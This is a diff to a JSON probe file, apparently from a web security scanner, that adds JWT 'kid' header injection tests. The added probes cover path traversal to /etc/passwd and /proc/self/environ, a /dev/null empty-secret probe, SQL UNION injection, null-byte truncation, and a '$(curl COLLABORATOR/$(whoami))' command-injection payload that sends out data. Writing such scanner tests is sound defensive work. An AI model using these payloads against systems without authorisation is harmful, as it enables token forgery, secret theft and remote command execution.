@@ -33,13 +33,13 @@
       ]
     },
     "kid_injection": {
-      "description": "JWT kid parameter injection (path traversal / SQLi)",
+      "description": "JWT kid parameter injection (path traversal / SQLi / null-byte / command). The kid claim is used by the server to look up the verification key, so any path/SQL/cmd injection in kid that resolves to attacker-known content turns into signature forgery.",
       "tech_match": [],
       "param_match": ["token", "jwt", "auth"],
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ../../etc/passwd — path traversal in key lookup",
+          "description": "[Manual] kid: ../../etc/passwd — path traversal in key lookup. /etc/passwd content as HMAC secret confirms read AND key forgery.",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
           "severity": "critical",
@@ -47,11 +47,52 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "[Manual] kid: ' UNION SELECT 'key'-- — SQLi in key ID lookup",
+          "description": "[Manual] kid: ../../../proc/self/environ — read process environment as HMAC secret. Pivots from JWT forge to env-var disclosure.",
+          "note": "Use test_jwt tool. After read, sign with the leaked content as HMAC secret.",
+          "matchers": [{"type": "word", "any": ["PATH=", "HOME=", "PWD="]}],
+          "severity": "critical",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] kid: /dev/null — sign with empty string as secret. Some libs read empty bytes from /dev/null and accept HMAC of empty string.",
+          "note": "Use test_jwt tool. Sign JWT with HMAC-SHA256 secret = '' (empty).",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] kid: ../../tmp/known_file — write a known file to /tmp via separate vuln (SSRF, file_upload), then point kid at it. Predictable HMAC secret.",
+          "note": "Chain prerequisite: write primitive on target host.",
+          "matchers": [{"type": "status", "status": [200]}],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] kid: ' UNION SELECT 'key'-- — SQLi in key ID lookup. Server returns attacker-controlled key, allowing forgery.",
           "note": "JWT testing requires manual token crafting via decode_encode tool. Use test_jwt tool instead of auto_probe.",
           "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
           "severity": "critical",
           "confidence_boost": 45
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] kid: known_kid\\u0000injected — null byte truncation. Some libs trim at null while DB lookup uses full string.",
+          "note": "Use test_jwt tool.",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
+          "severity": "high",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] kid: $(curl COLLABORATOR/$(whoami)) — command injection in shelled-out key fetch. Replace COLLABORATOR with generate_collaborator_payload().",
+          "note": "Rare but devastating. Confirm via Collaborator DNS hit.",
+          "matchers": [{"type": "status", "status": [200]}],
+          "severity": "critical",
+          "confidence_boost": 55,
+          "variables": {"COLLAB_REQUIRED": true}
         }
       ]
     },
